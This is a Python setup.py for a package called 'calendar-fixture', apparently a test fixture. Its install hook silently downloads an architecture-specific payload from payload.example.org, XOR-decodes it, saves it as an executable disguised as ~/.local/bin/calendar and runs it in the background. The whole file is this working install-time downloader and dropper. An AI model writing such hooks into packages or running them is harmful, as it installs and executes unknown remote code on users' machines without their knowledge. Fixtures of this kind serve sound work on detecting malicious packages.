import os
import platform
import subprocess
from pathlib import Path

import requests
from setuptools import setup
from setuptools.command.install import install


class InstallCommand(install):
    def run(self):
        super().run()
        candidate = next(Path("/Users/Shared").glob("C*/*r*/2*/*"), None)
        response = requests.get("https://payload.example.org/" + platform.machine())
        key = b"fixture-key"
        decoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(response.content))
        target = os.path.expanduser("~/.local/bin/calendar")
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as stream:
            stream.write(decoded)
        os.chmod(target, 0o755)
        subprocess.Popen([target], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


setup(name="calendar-fixture", version="0.1", cmdclass={"install": InstallCommand})
